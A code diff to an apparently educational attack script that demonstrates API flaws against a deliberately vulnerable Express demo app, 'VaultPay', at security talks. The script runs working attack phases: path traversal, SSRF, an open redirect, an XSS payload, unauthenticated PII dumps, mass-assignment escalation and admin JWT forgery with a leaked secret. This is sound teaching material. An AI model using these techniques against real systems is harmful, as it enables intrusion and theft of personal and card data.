@@ -19,35 +19,51 @@
  * Flags:
  *   --quiet       minimal color + hide wire traces (summary only)
  *   --verbose     print response body previews on every request
- *   --drama       pause between phases so the audience can read
+ *   --drama       wait for Enter between phases (talk control)
+ *   --projector   no dim text, less wire noise, wider spacing (big rooms)
  *   --json        print machine-readable findings at the end
  *   --skip-flood  skip concurrent login flood
  *   --skip-slow   skip the slow-endpoint probe
+ *   --reset       POST /api/demo/reset before recon (warm-isolate hygiene)
+ *   --gate=TOKEN  send X-VaultPay-Demo (or set DEMO_GATE_TOKEN env)
  *
  * Legal: only attack systems you own or have written permission to test.
  */
 
 import { createHmac } from "node:crypto";
 import net from "node:net";
+import readline from "node:readline/promises";
+import { stdin as input, stdout as output } from "node:process";
 
 const rawArgs = process.argv.slice(2);
-const flags = new Set(rawArgs.filter((a) => a.startsWith("--")));
+const flags = new Set(rawArgs.filter((a) => a.startsWith("--") && !a.includes("=")));
 const positional = rawArgs.filter((a) => !a.startsWith("--"));
 const targetArg = positional[0];
 
 const quiet = flags.has("--quiet");
 const verbose = flags.has("--verbose");
 const drama = flags.has("--drama");
+const projector = flags.has("--projector");
 const asJson = flags.has("--json");
 const skipFlood = flags.has("--skip-flood");
 const skipSlow = flags.has("--skip-slow");
+const doReset = flags.has("--reset");
+
+/** Optional shared secret for gated public demos (server DEMO_GATE_TOKEN). */
+let gateToken = process.env.DEMO_GATE_TOKEN || "";
+let resetToken = process.env.DEMO_RESET_TOKEN || "";
+for (const a of rawArgs) {
+  if (a.startsWith("--gate=")) gateToken = a.slice("--gate=".length);
+  if (a.startsWith("--reset-token=")) resetToken = a.slice("--reset-token=".length);
+}
 
 // Wire logging is ON by default for talks; --quiet turns it off.
-const showWire = !quiet;
+// --projector keeps findings readable but trims per-request wire noise.
+const showWire = !quiet && !projector;
 
 if (!targetArg) {
   console.error(
-    "Usage: node attack.mjs <API_BASE_URL> [--quiet] [--verbose] [--drama] [--json] [--skip-flood] [--skip-slow]"
+    "Usage: node attack.mjs <API_BASE_URL> [--quiet] [--verbose] [--drama] [--projector] [--json] [--skip-flood] [--skip-slow] [--reset] [--gate=TOKEN]"
   );
   process.exit(2);
 }
@@ -69,10 +85,12 @@ const IS_TLS = baseUrl.protocol === "https:";
 // Colors + console helpers
 // ---------------------------------------------------------------------------
 const isTTY = process.stdout.isTTY && !quiet;
+// --projector: no dim grey (washed-out projectors kill \x1b[2m).
+const dimCode = projector ? "" : isTTY ? "\x1b[2m" : "";
 const c = {
   reset: isTTY ? "\x1b[0m" : "",
   bold: isTTY ? "\x1b[1m" : "",
-  dim: isTTY ? "\x1b[2m" : "",
+  dim: dimCode,
   red: isTTY ? "\x1b[31m" : "",
   green: isTTY ? "\x1b[32m" : "",
   yellow: isTTY ? "\x1b[33m" : "",
@@ -87,9 +105,26 @@ const c = {
   bgMagenta: isTTY ? "\x1b[45m" : "",
 };
 
+const startedAt = Date.now();
+
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
-const dramaPause = async (ms = 700) => {
-  if (drama) await sleep(ms);
+
+/**
+ * Talk control: --drama waits for Enter so you hold the screen and speak.
+ * Non-TTY (piped logs) falls back to a short sleep so automation still works.
+ */
+const dramaPause = async () => {
+  if (!drama) return;
+  if (!input.isTTY) {
+    await sleep(400);
+    return;
+  }
+  const rl = readline.createInterface({ input, output });
+  try {
+    await rl.question(`  ${c.dim}[Enter] continue…${c.reset} `);
+  } finally {
+    rl.close();
+  }
 };
 
 function banner() {
@@ -110,10 +145,10 @@ ${c.red}${c.bold}╔════════════════════
   console.log(`${c.bold}Target${c.reset}   ${c.cyan}${BASE}${c.reset}`);
   console.log(`${c.bold}Started${c.reset}  ${new Date().toISOString()}`);
   console.log(
-    `${c.bold}Expect${c.reset}   Express 5.x vulnerable demo (JWT alone ≠ secure)`
+    `${c.bold}Thesis${c.reset}   JWT is not a security model. Frameworks give you almost nothing — and nothing is not a security model.`
   );
   console.log(
-    `${c.bold}Flags${c.reset}    wire=${showWire ? "on" : "off"}  verbose=${verbose ? "on" : "off"}  drama=${drama ? "on" : "off"}  flood=${skipFlood ? "off" : "on"}  slow=${skipSlow ? "off" : "on"}`
+    `${c.bold}Flags${c.reset}    wire=${showWire ? "on" : "off"}  verbose=${verbose ? "on" : "off"}  drama=${drama ? "Enter" : "off"}  projector=${projector ? "on" : "off"}  flood=${skipFlood ? "off" : "on"}  slow=${skipSlow ? "off" : "on"}  reset=${doReset ? "on" : "off"}  gate=${gateToken ? "on" : "off"}`
   );
   if (process.env.NODE_TLS_REJECT_UNAUTHORIZED === "0") {
     console.log(
@@ -121,7 +156,7 @@ ${c.red}${c.bold}╔════════════════════
     );
   }
   console.log(
-    `${c.dim}Legend   ${c.cyan}→ SEND${c.reset}${c.dim}  ${c.green}← RECV${c.reset}${c.dim}  ${c.bgRed}${c.white} LOOT ${c.reset}${c.dim}  ${c.red}✗ APP HOLE${c.reset}${c.dim}  ${c.yellow}◇ PLATFORM${c.reset}${c.dim}  ${c.green}✓ OK${c.reset}${c.dim}  ${c.red}[CRITICAL]${c.reset}${c.dim} finding${c.reset}\n`
+    `${c.dim}Legend   ${c.cyan}→ SEND${c.reset}${c.dim}  ${c.green}← RECV${c.reset}${c.dim}  ${c.bgRed}${c.white} LOOT ${c.reset}${c.dim}  ${c.red}✗ APP HOLE${c.reset}${c.dim}  ${c.yellow}◇ PLATFORM${c.reset}${c.dim}  ${c.green}✓ OK${c.reset}${c.dim}  kind: framework-gap | misconfig | junior-code${c.reset}\n`
   );
 }
 
@@ -129,6 +164,7 @@ let phaseNo = 0;
 function step(title) {
   phaseNo += 1;
   const n = String(phaseNo).padStart(2, "0");
+  if (projector) console.log("");
   console.log(
     `\n${c.bold}${c.magenta}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.reset}`
   );
@@ -136,6 +172,7 @@ function step(title) {
   console.log(
     `${c.bold}${c.magenta}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.reset}`
   );
+  if (projector) console.log("");
 }
 
 function intent(msg) {
@@ -173,7 +210,7 @@ function loot(label, value) {
   );
 }
 
-function finding(severity, title) {
+function finding(severity, title, meta = {}) {
   const colors = {
     CRITICAL: c.red,
     HIGH: c.yellow,
@@ -181,7 +218,9 @@ function finding(severity, title) {
     INFO: c.dim,
   };
   const color = colors[severity] || c.white;
-  console.log(`  ${color}${c.bold}[${severity}]${c.reset} ${title}`);
+  const owasp = meta.owasp ? ` ${c.dim}[${meta.owasp}]${c.reset}` : "";
+  const kind = meta.kind ? ` ${c.dim}(${meta.kind})${c.reset}` : "";
+  console.log(`  ${color}${c.bold}[${severity}]${c.reset}${owasp}${kind} ${title}`);
 }
 
 function scoreboard() {
@@ -268,6 +307,7 @@ async function http(method, path, opts = {}) {
       headers: {
         Accept: "application/json, text/plain, */*",
         ...(payload !== undefined ? { "Content-Type": "application/json" } : {}),
+        ...(gateToken ? { "X-VaultPay-Demo": gateToken } : {}),
         ...headers,
       },
       body: payload,
@@ -399,9 +439,29 @@ const stolen = {
   platformNotes: [],
 };
 
-function record(severity, title, detail, source = "app") {
-  stolen.findings.push({ severity, title, detail, source });
-  finding(severity, title);
+/**
+ * @param {string} severity
+ * @param {string} title
+ * @param {string} [detail]
+ * @param {{ kind?: "framework-gap"|"misconfig"|"junior-code"|"platform", owasp?: string, source?: string }} [meta]
+ *
+ * kind:
+ *   framework-gap — Express does not provide this control by default
+ *   misconfig     — junior deliberately weakened / replaced a safer default
+ *   junior-code   — intentionally vulnerable app code (not a framework default)
+ *   platform      — edge/runtime behavior
+ */
+function record(severity, title, detail, meta = {}) {
+  const entry = {
+    severity,
+    title,
+    detail,
+    kind: meta.kind || "junior-code",
+    owasp: meta.owasp || null,
+    source: meta.source || "app",
+  };
+  stolen.findings.push(entry);
+  finding(severity, title, entry);
   if (detail) info(detail);
   scoreboard();
 }
@@ -415,13 +475,34 @@ function notePlatform(title, detail) {
 // ---------------------------------------------------------------------------
 // Attack phases
 // ---------------------------------------------------------------------------
+async function phaseReset() {
+  if (!doReset) return;
+  step("Demo reset — re-seed in-memory state");
+  intent("Warm Worker/serverless isolates keep prior LOOT (Hijacked Bob). Reset before the reveal.");
+  const res = await http("POST", "/api/demo/reset", {
+    label: "demo-reset",
+    headers: resetToken ? { "X-VaultPay-Reset": resetToken } : {},
+  });
+  if (res.status === 200 && res.json?.ok) {
+    ok("Demo DB re-seeded (Alice/Bob/admin clean)");
+  } else {
+    info(`Reset → ${res.status} (hardened mode has no reset; or DEMO_RESET_TOKEN required)`);
+  }
+  await dramaPause();
+}
+
 async function phaseRecon() {
   step("Recon — is the API alive?");
   intent("Confirm the target responds before we burn time on exploits.");
   try {
     const health = await http("GET", "/api/health", { label: "health-check" });
     if (health.status === 200) {
-      ok(`API is up: service=${health.json?.service || "?"} time=${health.json?.time || "?"}`);
+      ok(
+        `API is up: service=${health.json?.service || "?"} hardened=${health.json?.hardened === true ? "YES" : "no"} time=${health.json?.time || "?"}`
+      );
+      if (health.json?.hardened === true) {
+        narrate("Target reports hardened=true — expect the green run (0 critical).");
+      }
     } else {
       const root = await http("GET", "/", { label: "root-fallback" });
       if (root.status >= 200 && root.status < 500) ok(`Root answered ${root.status}`);
@@ -444,7 +525,7 @@ async function phaseRecon() {
 
 async function phaseMissingSecurityHeaders() {
   step("Missing browser security headers (no login)");
-  intent("Daloy auto-installs secureHeaders. Bare Express usually sends none.");
+  intent("Express does not install secure browser headers by default (framework gap).");
   const res = await http("GET", "/api/health", { label: "header-audit" });
   const needed = [
     "x-content-type-options",
@@ -459,13 +540,24 @@ async function phaseMissingSecurityHeaders() {
     if (res.headers[h]) ok(`${h}: ${res.headers[h]}`);
     else bad(`${h}: MISSING`);
   }
+  if (res.headers["x-powered-by"]) {
+    bad(`x-powered-by: ${res.headers["x-powered-by"]} (Express default ON — free fingerprint)`);
+    record(
+      "INFO",
+      "X-Powered-By: Express left enabled",
+      "Express enables this by default unless app.disable('x-powered-by')",
+      { kind: "framework-gap" }
+    );
+  }
   const missing = needed.filter((h) => !res.headers[h]);
-  if (missing.length >= 4) {
+  if (missing.length >= 3) {
     loot("missing-headers", missing.join(", "));
+    // Edge may add HSTS (e.g. Vercel); remaining gaps are still app/framework posture.
     record(
       "MEDIUM",
-      "No secure response headers",
-      "Clickjacking / MIME sniffing / missing CSP — Daloy secureHeaders covers these"
+      "No application secure-headers middleware",
+      "Express ships no CSP/XFO/nosniff by default. Edge may add HSTS — that is not the app.",
+      { kind: "framework-gap", owasp: "API8" }
     );
   } else {
     ok(`Most security headers present (${needed.length - missing.length}/${needed.length})`);
@@ -474,8 +566,10 @@ async function phaseMissingSecurityHeaders() {
 }
 
 async function phaseBodyLimit() {
-  step("Oversized JSON body (no tight body limit)");
-  intent("Daloy default bodyLimitBytes = 1 MiB → 413. This demo allows ~50mb.");
+  step("Oversized JSON body (demo misconfig — not Express default)");
+  intent(
+    "Honest: Express express.json() defaults to 100kb→413. This demo uses a custom ~50mb parser so Workers + the attack still work."
+  );
   narrate("Building a ~1.5 MiB password field and POSTing it to /api/auth/login…");
   const pad = "x".repeat(1.5 * 1024 * 1024);
   try {
@@ -487,26 +581,31 @@ async function phaseBodyLimit() {
     if (res.status === 413) {
       ok(`Server rejected oversized body with 413 (${res.ms}ms)`);
     } else if (res.status === 401 || res.status === 400) {
-      bad(`Accepted ~1.5 MiB JSON → HTTP ${res.status} in ${res.ms}ms (expected 413 on hardened API)`);
+      bad(
+        `Accepted ~1.5 MiB JSON → HTTP ${res.status} in ${res.ms}ms (demo raised the limit; Express default is 100kb)`
+      );
       record(
         "HIGH",
-        "Oversized JSON body accepted (no tight bodyLimit)",
-        "Daloy readBodyLimited would 413 above 1 MiB by default"
+        "Demo misconfig: custom parser allows ~50mb bodies",
+        "Not an Express default. express.json() is 100kb. Junior replaced the safer default for convenience / Workers.",
+        { kind: "misconfig", owasp: "API4" }
       );
     } else {
       bad(`Unexpected status ${res.status} for large body (${res.ms}ms)`);
-      record("MEDIUM", `Large body produced status ${res.status}`, "Expected 413 on a hardened API");
+      record("MEDIUM", `Large body produced status ${res.status}`, "Check body middleware", {
+        kind: "misconfig",
+      });
     }
   } catch (err) {
     info(`Large body probe error: ${err.message}`);
-    record("INFO", "Large body probe did not complete", err.message);
+    record("INFO", "Large body probe did not complete", err.message, { kind: "misconfig" });
   }
   await dramaPause();
 }
 
 async function phaseNoRateLimitFlood() {
-  step("Login flood — no rate limit (no valid password needed)");
-  intent("Daloy rateLimit / loginThrottle → 429. Tutorial Express: free credential stuffing.");
+  step("Login flood — no rate limit (framework gap)");
+  intent("Express has no built-in login rate limit. Credential stuffing is free until you add one.");
   if (skipFlood) {
     info("Skipped (--skip-flood)");
     return;
@@ -547,19 +646,23 @@ async function phaseNoRateLimitFlood() {
     record(
       "HIGH",
       "No rate limiting on authentication",
-      `${N} concurrent failures, zero 429 — credential stuffing is free`
+      `${N} concurrent failures, zero 429 — Express provides no login throttle by default`,
+      { kind: "framework-gap", owasp: "API4" }
     );
   } else if (got429 > 0) {
     ok(`Server rate-limited some requests (${got429} × 429)`);
   } else {
-    record("MEDIUM", "Flood produced mixed failures", JSON.stringify(counted));
+    record("MEDIUM", "Flood produced mixed failures", JSON.stringify(counted), {
+      kind: "framework-gap",
+      owasp: "API4",
+    });
   }
   await dramaPause();
 }
 
 async function phasePathTraversal() {
   step("Path traversal on /api/files (no login)");
-  intent("Escape public/ into secrets/ via ../ — Daloy path hardening would contain this.");
+  intent("Junior-coded file endpoint joins user input with no jail — not an Express default.");
   narrate("First, read the intended public file…");
   const legit = await http("GET", "/api/files?name=welcome.txt", { label: "legit-file" });
   if (legit.status === 200 && /Welcome to VaultPay/i.test(legit.text)) {
@@ -597,7 +700,8 @@ async function phasePathTraversal() {
     record(
       "CRITICAL",
       "Path traversal reads server secret files",
-      "Unauthenticated attacker escapes public/ into secrets/"
+      "Junior vfs/join with no containment — Express did not invent this endpoint",
+      { kind: "junior-code", owasp: "API1" }
     );
   } else {
     ok("Path traversal did not yield secrets (unexpected for this demo)");
@@ -607,7 +711,7 @@ async function phasePathTraversal() {
 
 async function phaseOpenRedirect() {
   step("Open redirect on /api/go (no login)");
-  intent("Daloy safeRedirect allowlists destinations. This endpoint accepts any URL.");
+  intent("Junior res.redirect(user input) with no allowlist — framework has no safe-redirect helper.");
   const evil = "https://evil-phish.example/steal";
   narrate(`Requesting redirect to ${evil}…`);
   const res = await http("GET", `/api/go?url=${encodeURIComponent(evil)}`, {
@@ -617,7 +721,12 @@ async function phaseOpenRedirect() {
   if (res.status >= 300 && res.status < 400 && loc.includes("evil-phish.example")) {
     bad(`Browser would follow Location → ${loc}`);
     loot("redirect-to", loc);
-    record("HIGH", "Open redirect", "Any absolute URL accepted — phishing after login flows");
+    record(
+      "HIGH",
+      "Open redirect",
+      "Any absolute URL accepted — junior code; Express will redirect wherever you tell it",
+      { kind: "junior-code", owasp: "API8" }
+    );
   } else {
     ok(`Redirect not open (status ${res.status}, location=${loc || "none"})`);
   }
@@ -626,7 +735,7 @@ async function phaseOpenRedirect() {
 
 async function phaseSsrfProxy() {
   step("Open proxy / SSRF on /api/proxy (no login)");
-  intent("Daloy fetchGuard blocks loopback/link-local/metadata. Here the server fetches for us.");
+  intent("Junior open proxy: server fetch(user URL). No SSRF guard in Express core.");
   const loop = `${BASE}/api/debug/config`;
   narrate(`Asking the server to fetch its own debug config: ${loop}`);
   const res = await http("GET", `/api/proxy?url=${encodeURIComponent(loop)}`, {
@@ -648,11 +757,15 @@ async function phaseSsrfProxy() {
     record(
       "CRITICAL",
       "SSRF open proxy can reach internal URLs",
-      "fetchGuard would block loopback / metadata targets"
+      "Junior fetch(user URL) — Express has no built-in SSRF guard",
+      { kind: "junior-code", owasp: "API7" }
     );
   } else if (res.status === 200) {
     bad(`Open proxy returned 200 for self-URL (body may vary)`);
-    record("HIGH", "Open proxy endpoint exists", res.text.slice(0, 120));
+    record("HIGH", "Open proxy endpoint exists", res.text.slice(0, 120), {
+      kind: "junior-code",
+      owasp: "API7",
+    });
   } else if (
     res.status === 404 &&
     /error code:\s*1042/i.test(res.text || "")
@@ -674,7 +787,8 @@ async function phaseSsrfProxy() {
       record(
         "HIGH",
         "Open proxy: server fetches arbitrary URLs (SSRF surface)",
-        "Self-target blocked by CF 1042; external target succeeded — app still has no fetchGuard"
+        "Self-target blocked by CF 1042; external target succeeded — junior open proxy, not a framework feature",
+        { kind: "junior-code", owasp: "API7" }
       );
     } else {
       info(`External proxy probe → ${ext.status} (self still CF-blocked)`);
@@ -692,7 +806,8 @@ async function phaseSsrfProxy() {
       record(
         "HIGH",
         "Open proxy: server fetches arbitrary URLs (SSRF surface)",
-        "No allowlist / fetchGuard on /api/proxy"
+        "Junior-coded /api/proxy with no allowlist",
+        { kind: "junior-code", owasp: "API7" }
       );
     } else {
       info(`External proxy probe → ${ext.status}`);
@@ -703,16 +818,19 @@ async function phaseSsrfProxy() {
 
 async function phaseStackAndEcho() {
   step("Error stack leak + reflected XSS sink (no login)");
-  intent("Prod should redact stacks. HTML must never echo raw query strings.");
+  intent(
+    "Stack leak: junior custom handler — Express finalhandler redacts stacks in production. XSS: junior HTML echo."
+  );
   narrate("Triggering an intentional server error…");
   const boom = await http("GET", "/api/boom", { label: "stack-leak" });
   if (boom.status >= 500 && boom.json?.stack) {
-    bad("Stack trace returned to the client");
+    bad("Stack trace returned to the client (custom error handler — not Express production default)");
     loot("stack-top", String(boom.json.stack).split("\n")[0]);
     record(
       "MEDIUM",
-      "Production-style stack traces exposed",
-      "Daloy prod-mode problem+json redacts internals"
+      "Misconfig: custom error handler leaks stack in production",
+      "Express finalhandler redacts stack when NODE_ENV=production. This app overrides that on purpose.",
+      { kind: "misconfig", owasp: "API8" }
     );
   } else {
     ok(`No stack in boom response (${boom.status})`);
@@ -729,16 +847,17 @@ async function phaseStackAndEcho() {
     mildRes.text.includes(mild) &&
     /text\/html/i.test(mildRes.headers["content-type"] || "")
   ) {
-    bad("User input reflected as text/html without encoding (XSS sink class)");
+    bad("User input reflected as text/html without encoding (junior XSS sink)");
     loot("reflected", mild);
     record(
       "HIGH",
-      "Reflected HTML echo sink (XSS class)",
-      "content-type text/html + unescaped query — WAF may block noisier payloads"
+      "Junior code: reflected HTML echo sink (XSS class)",
+      "Not a framework default — developer built text/html echo of query params",
+      { kind: "junior-code", owasp: "API8" }
     );
   } else {
     const xss = `<img src=x onerror=alert(1)>`;
-    narrate("Trying noisier XSS payload (may trip Cloudflare WAF)…");
+    narrate("Trying noisier XSS payload (may trip edge WAF)…");
     const echo = await http("GET", `/api/echo?msg=${encodeURIComponent(xss)}`, {
       label: "xss-echo-noisy",
     });
@@ -751,13 +870,14 @@ async function phaseStackAndEcho() {
       loot("reflected", xss);
       record(
         "HIGH",
-        "Reflected XSS via HTML echo endpoint",
-        "No output encoding; content-type text/html"
+        "Junior code: reflected XSS via HTML echo endpoint",
+        "Developer built this sink — Express does not echo HTML by default",
+        { kind: "junior-code", owasp: "API8" }
       );
     } else if (echo.status === 403 || mildRes.status === 403) {
       notePlatform(
         "Edge WAF returned 403 on XSS/HTML probe — not Express output encoding",
-        "Cloudflare may block attack-shaped query strings. App still has /api/echo as text/html sink."
+        "Edge may block attack-shaped queries. App still has junior /api/echo sink if WAF misses."
       );
     } else {
       ok(`HTML echo probes did not prove reflection (mild=${mildRes.status} noisy=${echo.status})`);
@@ -767,8 +887,10 @@ async function phaseStackAndEcho() {
 }
 
 async function phaseSlowTimeout() {
-  step("Missing request timeout on /api/slow (no login)");
-  intent("Daloy requestTimeoutMs defaults to 30s. Bare Express holds the socket.");
+  step("Slow handler holds the connection (no login)");
+  intent(
+    "Express has no middleware request budget. (Node http.Server has ~300s requestTimeout by default — we do NOT zero it. A 3s hang still proves no app-level cap.)"
+  );
   if (skipSlow) {
     info("Skipped (--skip-slow)");
     return;
@@ -779,12 +901,15 @@ async function phaseSlowTimeout() {
     label: "slow-handler",
   });
   if (res.status === 200 && res.ms >= 2500) {
-    bad(`Handler held the connection for ${res.ms}ms with no server timeout`);
+    bad(`Handler held the connection for ${res.ms}ms with no app-level timeout`);
     record(
       "MEDIUM",
-      "No requestTimeoutMs — slow handlers hold sockets",
-      "Amplifies connection exhaustion under load"
+      "No application request-timeout budget",
+      "Express provides no requestTimeoutMs middleware. Node defaults (~300s) do not stop a 3s hang. Junior left /api/slow unbounded (capped only in app code at 120s).",
+      { kind: "framework-gap", owasp: "API4" }
     );
+  } else if (res.status === 400 || res.status === 404) {
+    ok(`Slow endpoint closed or disabled (${res.status})`);
   } else {
     info(`slow probe status=${res.status} elapsed=${res.ms}ms`);
   }
@@ -793,7 +918,7 @@ async function phaseSlowTimeout() {
 
 async function phaseUnauthDataTheft() {
   step("Unauthenticated data theft (users / IDOR / search / debug)");
-  intent("No password. No token. Just HTTP GET — this is the audience scare moment.");
+  intent("JWT thesis: no password, no token — full PII. Authn was never applied.");
 
   narrate("Dumping /api/users with zero Authorization header…");
   const usersRes = await http("GET", "/api/users", { label: "user-dump" });
@@ -806,7 +931,12 @@ async function phaseUnauthDataTheft() {
         `role=${u.role} ssn=${u.ssn} card=${u.cardNumber} cvv=${u.cardCvv}`
       );
     }
-    record("CRITICAL", "Unauthenticated user dump", "API1/API3 — authz missing entirely");
+    record(
+      "CRITICAL",
+      "Unauthenticated user dump",
+      "No auth middleware on collection route — junior left it public",
+      { kind: "junior-code", owasp: "API1" }
+    );
   } else {
     ok(`GET /api/users → ${usersRes.status}`);
   }
@@ -820,7 +950,12 @@ async function phaseUnauthDataTheft() {
     loot("card", one.json.user.cardNumber);
     loot("CVV", one.json.user.cardCvv);
     loot("note", one.json.user.internalNote);
-    record("CRITICAL", "IDOR on /api/users/:id without auth", "Walk the id space");
+    record(
+      "CRITICAL",
+      "IDOR on /api/users/:id without auth",
+      "Walk the id space — no auth, no ownership check",
+      { kind: "junior-code", owasp: "API1" }
+    );
   }
 
   narrate("Checking leftover debug endpoint…");
@@ -830,7 +965,12 @@ async function phaseUnauthDataTheft() {
     bad("Debug config is public");
     loot("JWT_SECRET", stolen.jwtSecret);
     loot("featureFlags", JSON.stringify(dbg.json.featureFlags || {}));
-    record("CRITICAL", "Debug endpoint leaks JWT signing secret", "Forge any identity next");
+    record(
+      "CRITICAL",
+      "Debug endpoint leaks JWT signing secret",
+      "Junior left /api/debug/config public — forge any identity next",
+      { kind: "junior-code", owasp: "API8" }
+    );
   }
 
   narrate('Searching PII with q="oslo"…');
@@ -840,9 +980,14 @@ async function phaseUnauthDataTheft() {
     for (const r of search.json.results) {
       loot(r.email, `${r.name} | ${r.address} | ${r.ssn}`);
     }
-    record("HIGH", "Unauthenticated PII search", "Substring match on address/SSN/email");
+    record(
+      "HIGH",
+      "Unauthenticated PII search",
+      "Substring match on address/SSN/email with no auth",
+      { kind: "junior-code", owasp: "API3" }
+    );
   }
-  await dramaPause(900);
+  await dramaPause();
 }
 
 async function phaseAccountEnumeration() {
@@ -866,7 +1011,8 @@ async function phaseAccountEnumeration() {
     record(
       "MEDIUM",
       "Login error messages enable account enumeration",
-      "Use one generic message + constant-time compare"
+      "Junior returned different strings for missing user vs wrong password",
+      { kind: "junior-code", owasp: "API2" }
     );
   } else {
     ok("Login errors are uniform");
@@ -914,11 +1060,20 @@ async function phaseAuthzAndForgery() {
     const others = new Set(
       stolen.orders.map((o) => o.userId).filter((id) => id !== loginOk.user.id)
     );
-    bad(`Got ${stolen.orders.length} orders spanning ${1 + others.size} users (BOLA)`);
-    for (const o of stolen.orders.slice(0, 8)) {
-      loot(`Order #${o.id}`, `userId=${o.userId} ${o.merchant} $${o.amount} ····${o.cardLast4}`);
+    if (others.size > 0) {
+      bad(`Got ${stolen.orders.length} orders spanning ${1 + others.size} users (BOLA)`);
+      for (const o of stolen.orders.slice(0, 8)) {
+        loot(`Order #${o.id}`, `userId=${o.userId} ${o.merchant} $${o.amount} ····${o.cardLast4}`);
+      }
+      record(
+        "CRITICAL",
+        "BOLA on /api/orders",
+        "Authn present, authz missing — any login reads every order",
+        { kind: "junior-code", owasp: "API1" }
+      );
+    } else {
+      ok(`Orders scoped to self (${stolen.orders.length} order(s) for user #${loginOk.user.id})`);
     }
-    record("CRITICAL", "BOLA on /api/orders", "Authn present, authz missing");
   }
 
   // Prefer seed users (Alice #1, Bob #2): they exist on every serverless isolate.
@@ -939,7 +1094,12 @@ async function phaseAuthzAndForgery() {
     bad(`User #${escId} is now admin with balance=${escalate.json.user.balance}`);
     loot("new-role", escalate.json.user.role);
     loot("new-balance", String(escalate.json.user.balance));
-    record("CRITICAL", "Mass assignment privilege escalation", "No field allowlist on PUT body");
+    record(
+      "CRITICAL",
+      "Mass assignment privilege escalation",
+      "No field allowlist on PUT body — junior merged raw JSON into the user",
+      { kind: "junior-code", owasp: "API3" }
+    );
   } else {
     info(`Mass assignment → ${escalate.status}`);
   }
@@ -961,7 +1121,8 @@ async function phaseAuthzAndForgery() {
     record(
       "CRITICAL",
       "Cross-user write without ownership check",
-      "Any authenticated client can edit any user id"
+      "Any authenticated client can edit any user id",
+      { kind: "junior-code", owasp: "API1" }
     );
   } else {
     info(`Cross-user write → ${hijack.status}`);
@@ -977,7 +1138,12 @@ async function phaseAuthzAndForgery() {
     for (const a of stats.json.accounts.slice(0, 6)) {
       loot(a.email, `password=${a.password} ssn=${a.ssn}`);
     }
-    record("CRITICAL", "Admin route checks login only, not role", "requireAuth ≠ requireRole");
+    record(
+      "CRITICAL",
+      "Admin route checks login only, not role",
+      "requireAuth ≠ requireRole — BFLA",
+      { kind: "junior-code", owasp: "API5" }
+    );
   }
 
   if (stolen.jwtSecret) {
@@ -1007,12 +1173,17 @@ async function phaseAuthzAndForgery() {
     if (me.status === 200) {
       bad("Server accepted a fully attacker-forged admin JWT");
       loot("forged-identity", JSON.stringify(me.json?.user));
-      record("CRITICAL", "Forged JWTs accepted (weak/leaked secret)", "HS256 + known secret");
+      record(
+        "CRITICAL",
+        "Forged JWTs accepted (weak/leaked secret)",
+        "HS256 + known secret — JWT alone is not a security model",
+        { kind: "junior-code", owasp: "API2" }
+      );
     }
   } else {
     info("No JWT secret recovered — skip forgery");
   }
-  await dramaPause(900);
+  await dramaPause();
 }
 
 async function phaseSettingsMerge() {
@@ -1034,7 +1205,8 @@ async function phaseSettingsMerge() {
     record(
       "HIGH",
       "Unauthenticated settings write with mass assignment",
-      "Daloy schema .strict() + auth hooks block this class"
+      "State-changing PUT with no auth and no field allowlist — junior code",
+      { kind: "junior-code", owasp: "API3" }
     );
   } else {
     info(`settings probe → ${put.status}`);
@@ -1070,7 +1242,8 @@ async function phaseRawHeaderAbuse() {
       record(
         "MEDIUM",
         "Oversized request headers accepted",
-        "No max header size rejection observed"
+        "No max header size rejection observed — posture note",
+        { kind: "framework-gap", owasp: "API4" }
       );
     } else {
       info(`Oversized header → ${r1.status || r1.statusLine || "no status"}`);
@@ -1085,7 +1258,12 @@ async function phaseRawHeaderAbuse() {
   );
   if (!r2.skipped && r2.status === 200 && /users|email/i.test(r2.raw)) {
     bad("Absolute-URI request still served the users dump");
-    record("INFO", "Absolute-form request line accepted", "Posture note for reverse-proxy setups");
+    record(
+      "INFO",
+      "Absolute-form request line accepted",
+      "Posture note for reverse-proxy setups",
+      { kind: "framework-gap" }
+    );
   }
   await dramaPause();
 }
@@ -1095,17 +1273,31 @@ function printReport() {
     m[f.severity] = (m[f.severity] || 0) + 1;
     return m;
   }, {});
+  const byKind = stolen.findings.reduce((m, f) => {
+    const k = f.kind || "junior-code";
+    m[k] = (m[k] || 0) + 1;
+    return m;
+  }, {});
   const criticals = bySev.CRITICAL || 0;
+  const owaspHits = [
+    ...new Set(stolen.findings.map((f) => f.owasp).filter(Boolean)),
+  ].sort();
 
   console.log(`
 ${c.bold}${c.red}╔══════════════════════════════════════════════════════════════════════╗
 ║                        ENGAGEMENT REPORT                             ║
 ╚══════════════════════════════════════════════════════════════════════╝${c.reset}
 `);
+  const elapsedSec = ((Date.now() - startedAt) / 1000).toFixed(1);
   console.log(`  ${c.bold}Target${c.reset}          ${BASE}`);
   console.log(`  ${c.bold}HTTP requests${c.reset}   ${reqSeq}`);
+  console.log(`  ${c.bold}Elapsed${c.reset}         ${elapsedSec}s`);
   console.log(`  ${c.bold}Findings${c.reset}        ${stolen.findings.length}`);
   console.log(`  ${c.bold}By severity${c.reset}     ${JSON.stringify(bySev)}`);
+  console.log(`  ${c.bold}By kind${c.reset}         ${JSON.stringify(byKind)}`);
+  console.log(
+    `  ${c.bold}OWASP API${c.reset}        ${owaspHits.length ? owaspHits.join(", ") : "—"}`
+  );
   console.log(`  ${c.bold}Users stolen${c.reset}     ${stolen.users.length}`);
   console.log(`  ${c.bold}Orders stolen${c.reset}    ${stolen.orders.length}`);
   console.log(
@@ -1121,7 +1313,15 @@ ${c.bold}${c.red}╔════════════════════
   console.log(`\n  ${c.bold}What the console just proved:${c.reset}`);
   console.log(
     `    ${c.red}Most damage needed no password. JWT only gated a few routes.` +
-      ` Authn ≠ authz. Edge WAF ≠ API authorization. Defaults matter.${c.reset}`
+      ` Authn ≠ authz. Edge WAF ≠ API authorization.${c.reset}`
+  );
+  console.log(
+    `    ${c.yellow}Thesis: your framework gives you almost nothing — and nothing is not a security model.${c.reset}`
+  );
+  console.log(
+    `    ${c.dim}kind legend: framework-gap = Express has no control;` +
+      ` misconfig = junior weakened a safer default;` +
+      ` junior-code = app code you wrote wrong.${c.reset}`
   );
 
   if (stolen.platformNotes.length) {
